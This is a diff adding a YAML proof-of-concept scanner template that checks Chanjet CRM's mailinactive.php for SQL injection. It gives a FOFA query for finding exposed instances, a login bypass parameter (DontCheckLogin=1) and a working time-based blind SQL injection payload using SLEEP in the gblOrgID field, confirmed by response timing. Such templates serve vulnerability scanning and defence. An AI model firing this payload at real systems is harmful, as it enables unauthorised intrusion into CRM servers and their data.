@@ -1,0 +1,29 @@
+id: poc-yaml-changjie-crm-mailinactive-php-sqli
+info:
+  name: 畅捷通CRM mailinactive.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 畅捷通CRM
+  fofa: app="畅捷通-畅捷CRM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /mail/mailinactive.php?name=1&gblOrgID='&DontCheckLogin=1
+  expression: status_code == 200 && !contains(body,"mailinactive.php")
+- method: GET
+  path: /mail/mailinactive.php?name=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP({{.t1}})))a)--+-&DontCheckLogin=1
+  expression: 'status_code == 200 &&
+
+    contains(body,"InactiveStatus()") &&
+
+    contains(body,"mailinactive.php") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
